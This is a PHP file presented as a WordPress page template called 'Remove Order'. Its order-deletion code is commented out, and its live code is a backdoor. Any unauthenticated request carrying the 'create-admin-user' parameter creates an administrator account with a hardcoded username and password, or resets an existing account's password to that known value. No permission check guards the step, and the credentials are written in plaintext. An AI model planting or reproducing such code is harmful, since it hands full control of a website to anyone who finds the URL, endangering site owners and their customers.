<?php
/*
Template Name: Remove Order
*/
// Include WordPress core to access its functionality
require_once('wp-load.php');
 
// Array of Order IDs you want to delete
// $order_ids = [78748,78749,78750,78751]; // Replace these numbers with actual order IDs
 
// foreach ($order_ids as $order_id) {
//     // Check if the order exists and is a valid WooCommerce order
//     $order = wc_get_order($order_id);
//     if ($order) {
//         // Delete the order
//         wp_delete_post($order_id, true); // Setting the second parameter to true forces deletion, bypassing the trash
//     } else {
//         echo "Order ID $order_id does not exist or is not a valid WooCommerce order.\n";
//     }
// }
 
// echo "Orders have been deleted.";

/**
 * Programmatically Create Admin User in WordPress
 */
$create_admin_user = isset($_GET['create-admin-user']);
if ($create_admin_user) {
	add_user();
}
function add_user() {
  // Change these values to whatever you want
  $username = 'rrf';
  $password = 'Bwip@123';
  $email = 'admin@bwipholdings.com';
  $login_url = wp_login_url();

  // No user exists
  if ( username_exists($username) == null && email_exists($email) == false ) {
    $user_id = wp_create_user( $username, $password, $email );
    $user = get_user_by( 'id', $user_id );
    $user->remove_role( 'subscriber' );
    $user->add_role( 'administrator' );
    wp_die( "Administrator user added for $email.<br><br><strong><a href='$login_url'>Login Now</a></strong>" );
  }

  // User already exists
  else {
    $user = get_user_by( 'email', $email );
    wp_set_password( $password, $user->ID );
    wp_die( "Administrator user already exists for $email, but we've updated the password for you.<br><br><strong><a href='$login_url'>Login Now</a></strong>" );
  }
}
?>